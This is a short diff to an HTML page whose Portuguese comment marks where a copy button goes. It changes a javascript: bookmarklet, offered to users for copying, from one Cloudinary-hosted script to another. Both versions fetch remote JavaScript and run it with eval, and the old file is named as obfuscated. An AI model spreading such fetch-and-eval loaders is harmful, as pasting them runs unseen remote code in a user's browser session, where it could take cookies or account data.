@@ -21,7 +21,7 @@
 <!-- Aqui é onde o botão de copiar será inserido -->
 <pre>
 <code>
-javascript:fetch("https://res.cloudinary.com/dgalluewb/raw/upload/v1745591915/Redação_iPhone_Gustavo_Ramos_ofuscado_mmumkg.js").then(t=>t.text()).then(eval);
+javascript:fetch(`https://res.cloudinary.com/dq8ah5on6/raw/upload/v1746130053/script_reehod.js?nocache=${Math.random()}`).then(t=>t.text()).then(eval);
 </code>
 </pre>
 
